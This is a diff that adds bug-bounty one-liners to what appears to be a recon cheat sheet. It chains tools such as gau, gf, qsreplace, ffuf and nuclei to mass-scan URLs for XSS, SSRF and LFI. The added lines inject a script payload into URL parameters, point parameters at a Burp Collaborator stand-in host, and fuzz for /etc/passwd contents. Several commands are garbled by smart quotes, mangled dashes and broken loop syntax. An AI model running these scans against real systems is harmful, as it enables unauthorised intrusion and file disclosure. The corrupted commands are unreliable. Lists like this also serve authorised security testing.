@@ -12,3 +12,12 @@ cat urls.txt | assestfinder | httprobe | gauplus | nuclei -t exposures/tokens/
 nuclei -u URL -t headless/extract-url.yaml -headless -silent | grep "^http" | nuclei -t exposures/tokens/
 shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
 cat list | nuclei -t nuclei-templates/{files,cves,tokens} -v -o result
+# 使用gau、waybackurls、gf、httpx、ffuf批量挖掘xss、lfi、ssrf等
+# XSS
+cat file.txt | gf xss | grep ‘source=’ | qsreplace ‘”><script>confirm(1)</script>’ | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “<script>confirm(1)” && echo “$host 33[0;31mVulnerablen”;done
+
+# SSRF
+findomain -t example.com -q | httpx -silent -threads 1000 | gau |  grep “=” | qsreplace http://YOUR.burpcollaborator.net
+
+# LFI
+findomain -t example.com -q |  waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
